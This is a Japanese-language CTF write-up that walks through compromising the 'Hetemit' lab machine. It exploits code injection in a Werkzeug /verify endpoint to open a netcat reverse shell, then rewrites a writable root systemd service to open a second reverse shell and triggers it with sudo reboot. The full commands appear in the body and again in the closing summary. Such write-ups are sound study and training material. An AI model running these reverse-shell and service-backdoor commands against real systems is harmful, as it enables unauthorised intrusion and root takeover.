+++
title = "Proving Grounds Practice - Internal Writeup"
date = "2026-10-14"
description = "Werkzeugデバッグコンソイル(os.system)経由でRCEを獲得後、書き込み可能なsystemdユニットファイルとsudo /sbin/rebootの組み合わせでroot権限を取得"
tags = ["Proving Grounds Practice", "CTF", "[Linux]", "[Werkzeug]", "[systemd]", "[Privilege Escalation]", "[Very Hard]"]
categories = ["Proving Grounds Practice"]
toc = true
draft = false
+++

## Machine Info

| Field   | Details          |
| ------- | ----------------- |
| Machine | Hetemit            |
| OS      | Linux (CentOS)     |

---

## Reconnaissance

### Nmap Scan (TCP全ポート)

```bash
nmap -sV -sC -p- 192.168.191.117
```

```text
PORT      STATE SERVICE     VERSION
21/tcp    open  ftp         vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: TIMEOUT
22/tcp    open  ssh         OpenSSH 8.0 (protocol 2.0)
80/tcp    open  http        Apache httpd 2.4.37 ((centos))
| http-methods:
|_  Potentially risky methods: TRACE
|_http-title: CentOS 提供的 Apache HTTP 服务器测试页
139/tcp   open  netbios-ssn Samba smbd 4
445/tcp   open  netbios-ssn Samba smbd 4
18000/tcp open  biimenu?
| fingerprint-strings:
|   HTTPOptions:
|     HTTP/1.0 403 Forbidden
|     <title>Action Controller: Exception caught</title>
50000/tcp open  http        Werkzeug httpd 1.0.1 (Python 3.6.8)
|_http-title: Site doesn't have a title (text/html; charset=utf-8).
|_http-server-header: Werkzeug/1.0.1 Python/3.6.8

Host script results:
| smb2-security-mode:
|   3.1.1:
|_    Message signing enabled but not required
```

21番ポートはAnonymous FTPが許可されていますが、ディレクトリリスティングはタイムアウトしました。18000番ポートはRuby on Rails系のエラーページ(Action Controller: Exception caught)を返すのみで、今回のルートには関与していません。注目すべきは50000番ポートで、`Werkzeug httpd 1.0.1 (Python 3.6.8)` というバージョン情報が得られました。

### Werkzeugのバージョン調査

```bash
searchsploit Werkzeug
```

```text
Pallets Werkzeug 0.15.4 - Path Traversal                 | python/webapps/50101.py
Werkzeug - 'Debug Shell' Command Execution                | multiple/remote/43905.py
Werkzeug - Debug Shell Command Execution (Metasploit)      | python/remote/37814.rb
```

Werkzeugの`Debug Shell` Command Executionに関連するExploitが存在することを確認しました。50000番ポートには以下の2つのエンドポイントが存在します。

```text
http://192.168.191.117:50000/generate
http://192.168.191.117:50000/verify
```

---

## Initial Access

### Werkzeug `/verify` エンドポイントでのコードインジェクション

`/verify` エンドポイントに対して演算式を送信すると、その結果が返ってくることを確認しました。これはサーバー側で`eval()`相当の処理が行われていることを示唆しています。

```bash
curl http://192.168.191.117:50000/verify -d "code=4*4"
```

```text
16
```

任意のPythonコードが実行可能であることが確認できたため、`os.system()`を利用してリバースシェルを送り返します。

```bash
curl http://192.168.191.117:50000/verify -d "code=os.system('nc 192.168.45.156 80 -e/bin/bash')"
```

攻撃用ホスト側で80番ポートにリスナーを立てておくことで、リバースシェルを受け取ります。

```bash
nc -lvnp 80
```

```text
listening on [any] 80 ...
connect to [192.168.45.156] from (UNKNOWN) [192.168.191.117] 52126
ls
app.py
__pycache__
```

シェルを安定化させます。

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
# Ctrl+Z
stty raw -echo; fg
# Enterを2回押す
```

プロンプトから、対象ホスト名が `hetemit`、ユーザーが `cmeeks` であることが確認できました(`[cmeeks@hetemit tmp]$`)。

---

## Privilege Escalation

### sudo -l の確認

```bash
sudo -l
```

```text
User cmeeks may run the following commands on hetemit:
    (root) NOPASSWD: /sbin/halt, /sbin/reboot, /sbin/poweroff
```

`cmeeks` ユーザーは `/sbin/halt`, `/sbin/reboot`, `/sbin/poweroff` をNOPASSWDでroot権限として実行可能であることが分かりました。

### 書き込み可能なsystemdユニットファイルの発見

```bash
find /etc -type f -writable 2>/dev/null
```

```text
/etc/systemd/system/pythonapp.service
```

`/etc/systemd/system/pythonapp.service` が書き込み可能であることが判明したため、`nano` で中身を確認・編集します。

```bash
nano /etc/systemd/system/pythonapp.service
```

```ini
[Unit]
Description=Python App
After=network-online.target

[Service]
Type=simple
WorkingDirectory=/home/cmeeks/restjson_hetemit
ExecStart=nc 192.168.45.156 22 -e /bin/bash
TimeoutSec=30
RestartSec=15s
User=root
ExecReload=/bin/kill -USR1 $MAINPID
Restart=on-failure

[Install]
WantedBy=multi-user.target
```

`ExecStart` を攻撃用ホストへのリバースシェル(`nc 192.168.45.156 22 -e /bin/bash`)に書き換え、`User=root` を指定しました。このサービスはroot権限で動作するため、起動させることができればroot権限でのコード実行が可能になります。

### サービスの起動 (sudo /sbin/reboot)

`cmeeks` には `systemctl` を直接操作する権限がないため、先ほど確認した `sudo /sbin/reboot` を利用してマシンを再起動し、`pythonapp.service` を起動時に実行させます。再起動前に、攻撃用ホスト側で22番ポートのリスナーを準備しておきます。

```bash
nc -lvnp 22
```

```bash
sudo /sbin/reboot
```

再起動後、`pythonapp.service` が起動し、改ざんした `ExecStart` が実行され、root権限のリバースシェルが返ってきました。

```text
listening on [any] 22 ...
connect to [192.168.45.156] from (UNKNOWN) [192.168.191.117] 49032
ls
app.py
__pycache__
whoami
root
ls

anaconda-ks.cfg
proof.txt
cat proof.txt
```

`whoami` の結果が `root` であることから、root権限の奪取に成功したことが確認できました。

---

## Summary

今回の攻撃経路は以下の通りです。

```text
Nmap (全ポートスキャン)
  ↓
50000番ポートでWerkzeug httpd 1.0.1 (Python 3.6.8) を確認
  ↓
/verify エンドポイントでコードインジェクション(eval)を確認
  ↓
os.system() でリバースシェル取得 (ユーザー: cmeeks)
  ↓
sudo -l で /sbin/halt, /sbin/reboot, /sbin/poweroff のNOPASSWD実行権限を確認
  ↓
/etc/systemd/system/pythonapp.service が書き込み可能であることを発見
  ↓
ExecStart をリバースシェルに書き換え、User=root に設定
  ↓
sudo /sbin/reboot でマシンを再起動しサービスを起動
  ↓
root権限のリバースシェルを獲得
```

### Key Commands

```bash
# Port scan (TCP全ポート)
nmap -sV -sC -p- 192.168.191.117

# Werkzeugの既知Exploit確認
searchsploit Werkzeug

# /verify エンドポイントへのコードインジェクション確認
curl http://192.168.191.117:50000/verify -d "code=4*4"

# os.system() によるリバースシェル取得
curl http://192.168.191.117:50000/verify -d "code=os.system('nc 192.168.45.156 80 -e/bin/bash')"

# シェルの安定化
python3 -c 'import pty; pty.spawn("/bin/bash")'

# sudo権限の確認
sudo -l

# 書き込み可能なファイルの探索
find /etc -type f -writable 2>/dev/null

# systemdユニットファイルの改ざん
nano /etc/systemd/system/pythonapp.service

# 再起動によるサービス起動とroot権限奪取
sudo /sbin/reboot
```
